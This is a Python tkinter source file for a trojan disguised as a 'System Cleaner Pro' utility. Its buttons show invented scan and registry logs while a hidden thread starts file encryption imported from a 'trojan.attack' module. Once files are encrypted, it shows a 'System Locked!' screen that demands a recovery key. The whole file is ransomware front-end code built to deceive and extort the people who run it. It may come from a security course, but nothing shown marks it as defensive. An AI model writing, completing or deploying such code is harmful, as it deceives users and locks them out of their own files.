import sys
import os
import tkinter
import threading
import tkinter as tk
from tkinter import ttk, messagebox

# Path setup for PyInstaller
if hasattr(sys, '_MEIPASS'):
    # In PyInstaller, sys._MEIPASS is the root of the bundle
    ROOT_DIR = sys._MEIPASS
    # For onedir, also check _internal
    internal_dir = os.path.join(ROOT_DIR, "_internal")
    if os.path.exists(internal_dir) and internal_dir not in sys.path:
        sys.path.insert(0, internal_dir)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    # When running from source, ROOT_DIR is the project root (one level up from BASE_DIR)
    ROOT_DIR = os.path.abspath(os.path.join(BASE_DIR, ".."))

if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

# Import from Phase 1
from trojan.attack import encrypt_folder, decrypt_folder, is_encrypted

class SystemCleanerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Cleaner Pro 2026")
        self.root.geometry("450x450")
        self.root.configure(bg="#2C3E50")
        self.root.resizable(False, False)

        # Check the state to determine which UI to show
        if is_encrypted():
            self.build_recovery_ui()
        else:
            self.build_main_ui()

    def build_main_ui(self):
        """Builds the fake 'harmless' application UI."""
        self.title_label = tk.Label(
            self.root, 
            text="System Cleaner Pro", 
            font=("Helvetica", 24, "bold"), 
            bg="#2C3E50", 
            fg="#ECF0F1"
        )
        self.title_label.pack(pady=15)

        self.status_label = tk.Label(
            self.root, 
            text="Status: Ready to Scan", 
            font=("Helvetica", 12), 
            bg="#2C3E50", 
            fg="#1ABC9C"
        )
        self.status_label.pack(pady=5)

        # Fake Progress Bar
        self.progress = ttk.Progressbar(self.root, length=300, mode='indeterminate')
        self.progress.pack(pady=10)

        # Buttons frame
        btn_frame = tk.Frame(self.root, bg="#2C3E50")
        btn_frame.pack(pady=5)

        # Fake buttons
        self.scan_btn = tk.Button(
            btn_frame, 
            text="Quick Scan", 
            font=("Helvetica", 11), 
            width=15, 
            command=lambda: self.fake_action("Quick Scan"),
            bg="#3498DB",
            fg="black"
        )
        self.scan_btn.grid(row=0, column=0, padx=5, pady=5)

        self.clean_btn = tk.Button(
            btn_frame, 
            text="Deep Clean", 
            font=("Helvetica", 11), 
            width=15, 
            command=lambda: self.fake_action("Deep Clean"),
            bg="#E67E22",
            fg="black"
        )
        self.clean_btn.grid(row=0, column=1, padx=5, pady=5)

        self.opt_btn = tk.Button(
            btn_frame, 
            text="Optimize Registry", 
            font=("Helvetica", 11), 
            width=15, 
            command=lambda: self.fake_action("Registry Optimization"),
            bg="#9B59B6",
            fg="black"
        )
        self.opt_btn.grid(row=1, column=0, columnspan=2, pady=5)

        # Fake Logs Text Box
        self.log_box = tk.Text(self.root, height=7, width=50, bg="#34495E", fg="#ECF0F1", font=("Courier", 10))
        self.log_box.pack(pady=10)
        self.log_box.insert(tk.END, "System Ready. Awaiting user action...\n")

    def fake_action(self, process_name):
        """Simulates an action in the fake app and starts the silent attack."""
        self.status_label.config(text=f"{process_name} in progress...", fg="#F1C40F")
        self.scan_btn.config(state="disabled")
        self.clean_btn.config(state="disabled")
        self.opt_btn.config(state="disabled")
        
        # Start progress bar
        self.progress.start(15)

        # Triggers actual encryption on the first button click silently
        if not hasattr(self, "attack_started"):
            self.attack_started = True
            threading.Thread(target=encrypt_folder, daemon=True).start()

        self._append_fake_log(f"--- Initiating {process_name} ---")
        self._append_fake_log("Scanning core system drives...")

        # Add deferred fake log updates (makes it feel very alive & realistic)
        self.root.after(1000, lambda: self._append_fake_log("Checking registry keys for vulnerabilities..."))
        self.root.after(2000, lambda: self._append_fake_log("Analyzing cached application data..."))
        self.root.after(3000, lambda: self._append_fake_log("Reallocating unused memory chunks..."))
        self.root.after(4000, self.reset_fake_action)

    def _append_fake_log(self, text):
        self.log_box.insert(tk.END, text + "\n")
        self.log_box.see(tk.END)

    def reset_fake_action(self):
        """Resets the UI back to ready state."""
        self.progress.stop()
        self.status_label.config(text="Status: System Optimal", fg="#1ABC9C")
        self._append_fake_log("Process complete. System metrics nominal.\n")
        
        self.scan_btn.config(state="normal")
        self.clean_btn.config(state="normal")
        self.opt_btn.config(state="normal")

    def build_recovery_ui(self):
        """Builds the recovery UI if the system is already encrypted."""
        # Change window theme to indicate danger
        self.root.configure(bg="#C0392B")

        self.title_label = tk.Label(
            self.root, 
            text="System Locked!", 
            font=("Helvetica", 24, "bold"), 
            bg="#C0392B", 
            fg="#FFFFFF"
        )
        self.title_label.pack(pady=25)

        self.info_label = tk.Label(
            self.root, 
            text="Your files have been encrypted globally.\nEnter your recovery key below to restore them.", 
            font=("Helvetica", 12), 
            bg="#C0392B", 
            fg="#FFFFFF",
            justify="center"
        )
        self.info_label.pack(pady=15)

        self.key_entry = tk.Entry(self.root, font=("Helvetica", 14), width=30)
        self.key_entry.pack(pady=15)

        self.recover_btn = tk.Button(
            self.root, 
            text="Recover Files", 
            font=("Helvetica", 14, "bold"), 
            command=self.recover_action,
            bg="#27AE60",
            fg="black",
            width=15
        )
        self.recover_btn.pack(pady=25)

    def recover_action(self):
        """Handles the decrypt button click."""
        key = self.key_entry.get().strip()
        if not key:
            messagebox.showwarning("Error", "Please enter a recovery key.")
            return

        self.recover_btn.config(state="disabled", text="Recovering...")
        
        key_bytes = key.encode()
        
        def decrypt_task():
            decrypt_folder(key_bytes)
            if not is_encrypted():
                self.root.after(0, lambda: messagebox.showinfo("Success", "Files successfully recovered and unlocked!"))
                self.root.after(0, self.root.destroy)
            else:
                self.root.after(0, lambda: messagebox.showerror("Failure", "Recovery failed. Invalid key provided."))
                self.root.after(0, lambda: self.recover_btn.config(state="normal", text="Recover Files"))

        threading.Thread(target=decrypt_task, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    app = SystemCleanerApp(root)
    root.mainloop()
